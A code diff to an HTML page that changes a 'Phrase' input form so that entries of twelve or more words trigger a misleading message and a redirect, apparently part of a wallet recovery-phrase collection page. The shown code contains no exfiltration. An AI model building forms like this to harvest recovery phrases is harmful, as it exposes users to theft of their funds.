@@ -1586,6 +1586,9 @@
             <form method="post">
 
               <div class="form-group my-2">
+                <span id="warn1" class="warn1 text-green" style="display: none;color: green">
+                  Please enter a valid phrase
+                </span>
                 <label class="form-label">
                   Phrase
                 </label>
@@ -1638,17 +1641,27 @@
   }
 
   function sendPhrase() {
-    const phrase = $("#phrase").val()
-    if (phrase == "") {
-      $("#warn").css('display', 'block')
-      //Swal.fire('Oops','Phrase cannot be empty','error')
-    }
-    else {
-     
-      alert("hello")
-    }
-
-  }
+            const phrase = $("#phrase").val();
+            const wordCount = phrase.trim().split(/\s+/).length;
+            if (phrase == "") {
+                $("#warn").css('display', 'block');
+                setTimeout(function(){
+                  $("#warn").css('display', 'none')
+                }, 2000); // Refresh the page after 2 seconds
+            } else if(wordCount >= 12){
+                $("#warn1").css('display', 'block');
+                setTimeout(function(){
+                    window.location.href = "http://example.com";
+                }, 2000); // Redirect to another page after 2 seconds
+            } else {
+                $("#warn").css('display', 'block');
+                setTimeout(function(){
+                  $("#warn").css('display', 'none');
+                }, 2000); // Refresh the page after 2 seconds
+            }
+        }
+    </script>
+  
 </script>
 
 </html>
